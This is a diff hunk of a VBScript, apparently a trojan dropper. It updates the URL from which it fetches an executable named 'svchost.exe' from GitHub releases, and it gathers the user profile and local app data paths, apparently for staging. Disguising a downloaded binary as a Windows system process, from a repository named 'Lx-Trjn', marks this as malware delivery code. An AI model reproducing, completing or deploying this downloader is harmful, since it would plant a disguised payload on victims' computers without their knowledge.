@@ -24,7 +24,7 @@ Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' ==== Configurações ====
-exeUrl = "https://github.com/Desconhecidoporlx/Lx-Trjn/releases/latest/download/svchost.exe"
+exeUrl = "https://github.com/DesconhecidoPorOpcao/0T.romujaPnp/releases/latest/download/svchost.exe"
 
 userProfile  = shell.ExpandEnvironmentStrings("%USERPROFILE%")
 localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
